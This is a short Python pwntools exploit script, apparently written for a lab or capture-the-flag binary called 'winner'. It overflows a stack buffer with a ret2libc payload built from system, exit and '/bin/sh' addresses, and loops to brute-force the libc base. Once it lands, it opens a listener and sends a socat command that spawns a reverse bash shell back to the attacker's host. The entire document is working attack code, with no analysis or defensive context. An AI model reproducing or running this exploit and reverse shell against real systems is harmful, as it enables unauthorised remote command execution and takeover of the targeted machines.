from pwn import *

elf = ELF("./winner", checksec=False)
libc = ELF("libc_target", checksec=False)
context.binary = elf

offset = 88
tries = 0

sh_offset = next(libc.search(b"/bin/sh"))
system_offset = libc.symbols["system"]
exit_offset = libc.symbols["exit"]

libc_base = 0xF7DAB000

payload = b""
payload += p32(libc_base + system_offset)
payload += p32(libc_base + exit_offset)
payload += p32(libc_base + sh_offset)

exploit = b"A" * offset + payload


while True:
    #ssh -L 6969:localhost:1234 bob@172.16.164.140
    process = remote("localhost", 6969)
    process.sendline(exploit)

    recv = process.recvrepeat(timeout=1)

    info("Attempt no. " + str(tries))
    tries += 1

    if recv[-1:] == b' ':
        reverse = listen(1337)
        success("Pwnd! Hack away.")
        process.sendline(b'socat TCP:172.16.164.1:1337 EXEC:/bin/bash')
        reverse.interactive()
        break

    process.close()
